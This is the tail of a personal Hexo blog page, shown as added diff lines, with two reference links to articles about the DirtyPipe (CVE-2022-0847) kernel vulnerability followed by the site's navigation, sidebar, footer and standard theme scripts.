+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/void_zk/article/details/125884637?app_version=5.8.1&amp;code=app_1562916241&amp;csdn_share_tail={&quot;type&quot;%3A&quot;blog&quot;%2C&quot;rType&quot;%3A&quot;article&quot;%2C&quot;rId&quot;%3A&quot;125884637&quot;%2C&quot;source&quot;%3A&quot;m0_67072125&quot;}&amp;uLinkId=usr1mkqgl919blen&amp;utm_source=app">DirtyPipe(CVE-2022-0847) 脏管漏洞复现分析</a> </li>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/480663969#:~:text=通过注入PIPE_BUF_FLAG_CAN_MERGE标记到页面缓存，当新数据写入到以特殊方式初始化的管道中时将可以覆盖页面缓存中的数据。,3x 利用">CVE-2022-0847漏洞对容器环境影响的深度分析</a> </li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Kernel/" rel="tag"><i class="fa fa-tag"></i> Kernel</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/11/23/Linux%20%E5%90%84%E7%A7%8D%E5%86%85%E5%AD%98%E5%85%B1%E4%BA%AB/" rel="prev" title="Linux 各种内存共享">
+      <i class="fa fa-chevron-left"></i> Linux 各种内存共享
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">116</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">2.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">38:01</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
